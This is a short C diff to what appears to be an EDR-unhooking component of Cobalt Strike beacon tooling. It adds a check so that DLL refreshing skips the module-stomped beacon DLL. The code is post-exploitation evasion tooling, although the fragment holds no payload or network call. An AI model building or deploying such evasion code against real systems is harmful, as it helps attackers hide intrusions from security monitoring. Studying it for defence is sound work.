@@ -4,7 +4,32 @@
 #include "unhook.h"
 #include "beacon.h"
 
-void RefreshPE(void * buffer)
+BOOL IsBeaconDLL(char* stomp, size_t beaconDllLength, PWSTR wszBaseDllName, USHORT BaseDllLength)
+{
+    BOOL isBeacon = FALSE;
+    if (beaconDllLength * 2 == BaseDllLength)
+    {
+        isBeacon = TRUE;
+        for (int i = 0; i < beaconDllLength; i++)
+        {
+            // make them lower case
+            char c1 = stomp[i];
+            char c2 = wszBaseDllName[i];
+            if (c1 >= 'A' && c1 <= 'Z')
+                c1 += 32;
+            if (c2 >= 'A' && c2 <= 'Z')
+                c2 += 32;
+            if (c1 != c2)
+            {
+                isBeacon = FALSE;
+                break;
+            }
+        }
+    }
+    return isBeacon;
+}
+
+void RefreshPE(void * buffer, char* stomp)
 {
     HMODULE hModule;
     PWSTR wszFullDllName;
@@ -14,13 +39,15 @@ void RefreshPE(void * buffer)
     PLDR_DATA_TABLE_ENTRY pLdteHead = NULL;
     PLDR_DATA_TABLE_ENTRY pLdteCurrent = NULL;
 
+    size_t beaconDllLength = strlen(stomp);
+
     dprintf("[REFRESH] Running DLLRefresher");
 
     pLdteHead = GetInMemoryOrderModuleList();
     pLdteCurrent = pLdteHead;
 
     do {
-        if (pLdteCurrent->FullDllName.Length > 2)
+        if (pLdteCurrent->FullDllName.Length > 2 && !IsBeaconDLL(stomp, beaconDllLength, pLdteCurrent->BaseDllName.pBuffer, pLdteCurrent->BaseDllName.Length))
         {
             wszFullDllName = pLdteCurrent->FullDllName.pBuffer;
             wszBaseDllName = pLdteCurrent->BaseDllName.pBuffer;
